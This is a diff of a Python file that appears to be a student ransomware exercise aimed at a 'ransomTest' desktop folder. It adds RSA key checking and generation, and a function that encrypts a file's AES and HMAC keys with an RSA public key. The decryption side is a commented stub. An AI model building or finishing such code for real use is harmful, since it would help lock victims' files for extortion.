@@ -1,36 +1,37 @@
 import os
 
-# Probably dont need
 import base64
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
-
-# Definitely need
+from cryptography.hazmat.primitives import hashes, hmac, serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import padding as PADDING
+from fileEncryption import MyFileEncryptMAC
 
 import json
 
 # Constants
 
-
-FILE_PATH = "C:/Users/corni/Desktop/ransomTest"
 PUB_FOUND = False
 PRIV_FOUND = False
 PASS_SIZE = 10
+IV_SIZE = 16
+PAD_SIZE = 128
+HMAC_KEY = 16
+HMAC_KEY_LEN = len(str(HMAC_KEY))
+KEY_SIZE = 32
+ENC_KEY_SIZE = 32
+FILE_PATH = "C:/Users/corni/Desktop/ransomTest"
+BACKEND = default_backend()
 
 
-
-def findKeys(filePath):
+def keyCheck():
     
-    privFound = 1
-    pubFound = 1
+    pubKey = "/publicTest.pem"
+    privKey = "/privateTest.pem"
 
-    pubKey = "/public99.pem"
-    privKey = "/private99.pem"
-
-    pubFilePath = filePath + pubKey
-    privFilePath = filePath + privKey
+    pubFilePath = FILE_PATH + pubKey
+    privFilePath = FILE_PATH + privKey
 
     pubExists = os.path.isfile(pubFilePath)
     privExists = os.path.isfile(privFilePath)
@@ -92,22 +93,44 @@ def findKeys(filePath):
             print("Writing pubKey:")
             f.write(public_pem)
 
-        
- 
+
+def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
+
+    C, IV, tag, EncKey, HMACKey, ext = MyFileEncryptMAC(FILE_PATH)
+
+    with open(RSA_Publickey_filepath, 'rb') as pubKey:
+        publicPEM = serialization.load_pem_public_key(pubKey.read(), backend = BACKEND)
+        #print("Public key: " + str(publicPEM))
+
+    concatKey = EncKey + HMACKey
+
+    RSACipher = publicPEM.encrypt(
+        concatKey,
+        PADDING.OAEP(mgf = PADDING.MGF1(algorithm = hashes.SHA256()), 
+        algorithm = hashes.SHA256(), 
+        label = None))
+
+    return(RSACipher, C, IV, tag, ext)
 
 
-def fileFindTest():
+
+# def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):
+
+
+    
+
+
+#--------------------------------------------------------
+# MAIN
+#--------------------------------------------------------
+
+
+def main():
 
     
     print("Running Test")
-    findKeys(FILE_PATH)
+    keyCheck()
 
 
-fileFindTest()
-
-
-
-# mainMACDesktop()
-
-# if __name__ == '__main__':
-#     main()
+if __name__ == '__main__':
+    main()
